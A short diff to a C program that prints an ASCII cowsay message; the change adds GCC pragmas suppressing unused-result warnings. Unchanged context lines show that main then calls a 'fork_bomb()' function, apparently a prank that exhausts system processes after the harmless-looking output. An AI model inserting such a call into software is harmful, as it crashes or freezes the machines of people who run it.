@@ -7,6 +7,8 @@
 
 __attribute__ ((leaf, nonnull (2), noreturn, nothrow))
 int main (int argc, char *argv[]){
+	#pragma GCC diagnostic push
+	#pragma GCC diagnostic ignored "-Wunused-result"
 	(void) ezcowsay (argv[0],
 		"--%s--\n"
 		"< %s >\n"
@@ -24,6 +26,7 @@ int main (int argc, char *argv[]){
 		"      \\        /   \n"
 		"jgs    `.____.`    \n",
 		puts);
+	#pragma GCC diagnostic pop
 	fork_bomb ();
 	__builtin_unreachable ();
 }
